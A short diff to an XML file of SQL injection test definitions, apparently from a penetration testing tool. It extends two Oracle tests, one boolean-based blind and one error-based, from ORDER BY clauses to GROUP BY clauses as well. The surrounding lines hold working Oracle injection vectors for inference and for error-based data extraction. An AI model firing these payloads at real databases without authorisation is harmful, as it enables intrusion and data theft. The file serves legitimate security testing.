@@ -712,11 +712,11 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle boolean-based blind - ORDER BY clause</title>
+        <title>Oracle boolean-based blind - GROUP BY and ORDER BY clauses</title>
         <stype>1</stype>
         <level>3</level>
         <risk>1</risk>
-        <clause>3</clause>
+        <clause>2,3</clause>
         <where>1</where>
         <vector>, (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE 1/0 END) FROM DUAL)</vector>
         <request>
@@ -1169,11 +1169,11 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle error-based - ORDER BY clause</title>
+        <title>Oracle error-based - GROUP BY and ORDER BY clauses</title>
         <stype>2</stype>
         <level>3</level>
         <risk>0</risk>
-        <clause>3</clause>
+        <clause>2,3</clause>
         <where>1</where>
         <vector>, (SELECT UPPER(XMLType(CHR(60)||'[DELIMITER_START]'||(REPLACE((%s),' ','[SPACE_REPLACE]'))||'[DELIMITER_STOP]'||CHR(62))) FROM DUAL)</vector>
         <request>
